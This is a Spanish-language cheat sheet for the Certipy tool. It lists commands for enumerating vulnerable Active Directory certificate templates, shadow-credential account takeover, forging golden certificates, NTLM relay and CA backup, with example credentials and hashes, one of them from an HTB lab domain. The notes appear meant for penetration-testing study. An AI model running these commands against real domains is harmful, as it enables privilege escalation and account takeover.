# Certificate Authority & Common Name Enumeration with Certipy

Certipy es una herramienta para interactuar con Active Directory Certificate Services (AD CS). Permite enumerar, solicitar y gestionar certificados, así como identificar configuraciones vulnerables.

- [ESC9 ATTACK](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension)

## Instalación
- Instalar con pipx: `pipx install certipy-ad`

## Uso Básico
- Enumerar configuraciones vulnerables:
    ```bash
    certipy-ad find -u usuario@dominio.local -p contraseña -dc-ip 192.168.1.100 -vulnerable
    ```

## Comandos Principales

Certipy ofrece una variedad de comandos para realizar tareas relacionadas con AD CS. A continuación, se detalla cada comando con su descripción, opciones clave y ejemplos:

| Comando   | Descripción                                                                 | Opciones Clave y Ejemplos                                                                                                                                                     |
|-----------|-----------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `find`    | Enumerar plantillas de certificados de AD CS, CAs y configuraciones, útil para identificar vulnerabilidades. | `-bloodhound`, `-enabled`, `-vulnerable`, `-dc-ip`. Ejemplo: `certipy-ad find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable`                              |
| `req`     | Solicitar, recuperar y renovar certificados, útil para probar configuraciones. | `-ca`, `-template`, `-upn`, `-dns`. Ejemplo: `certipy-ad req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User`              |
| `auth`    | Autenticar usando PKINIT Kerberos o Schannel con certificados.              | `-pfx`, `-no-save`, `-ptt`, `-dc-ip`. Ejemplo: `certipy-ad auth -pfx administrator.pfx -dc-ip 172.16.126.128`                                                               |
| `shadow`  | Gestionar Credenciales Shadow para toma de control de cuentas.             | `-account`, `-device-id`, `auto`. Ejemplo: `certipy-ad shadow auto -username John@corp.local -p Passw0rd -account Jane`                                                     |
| `forge`   | Crear Certificados Dorados usando CA comprometida, útil para escalar privilegios. | `-ca-pfx`, `-upn`, `-dns`, `-template`. Ejemplo: `certipy-ad forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'` |
| `cert`    | Trabajar con archivos PFX, descifrar y extraer certificados/claves.         | `-pfx`, `-password`, `-export`, `-nokey`. Ejemplo: `certipy-ad cert -pfx encrypted.pfx -password "a387a1a1-5276-4488-9877-4e90da7567a4" -export -out decrypted.pfx`         |
| `relay`   | Realizar relay NTLM a endpoints HTTP/RPC de AD CS para explotar vulnerabilidades. | `-target`, `-ca`, `-template`. Ejemplo: `certipy-ad relay -target 'http://ca.corp.local'`                                                                                   |
| `ca`      | Gestionar CA y certificados, incluyendo respaldos y adición de oficiales.  | `-backup`, `-add-officer`, `-enable-template`. Ejemplo: `certipy-ad ca -backup -ca 'corp-DC-CA' -username administrator@corp.local -hashes fc525c9683e8fe067095ba2ddc971889` |
| `template`| Gestionar plantillas de certificados, incluyendo cambios de configuración. | `-save-old`, `-configuration`. Ejemplo: `certipy-ad template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old`                                    |

## Ejemplo de Uso
- Enumerar configuraciones vulnerables con hashes NTLM:
    ```bash
    certipy-ad find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout
    ```